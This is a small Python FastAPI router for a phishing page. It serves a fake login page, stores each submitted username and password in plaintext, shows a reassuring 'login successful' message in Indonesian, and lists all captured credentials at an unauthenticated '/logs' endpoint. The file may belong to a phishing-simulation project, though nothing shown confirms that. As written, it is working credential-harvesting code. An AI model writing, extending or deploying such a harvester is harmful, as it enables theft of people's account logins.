from fastapi import APIRouter, Request, Form
from fastapi.responses import HTMLResponse
from app.services.logger import log_event

router = APIRouter()
PHISH_LOG = []

@router.get("/", response_class=HTMLResponse)
def phishing_page():
    with open("app/phishing/index.html", "r") as f:
        return f.read()

@router.post("/capture")
def capture_credentials(username: str = Form(...), password: str = Form(...)):
    PHISH_LOG.append({"user": username, "pass": password})
    log_event("phishing_login", "-", username)
    return {"message": "Login berhasil. Tunggu redirect..."}

@router.get("/logs")
def get_captured():
    return PHISH_LOG
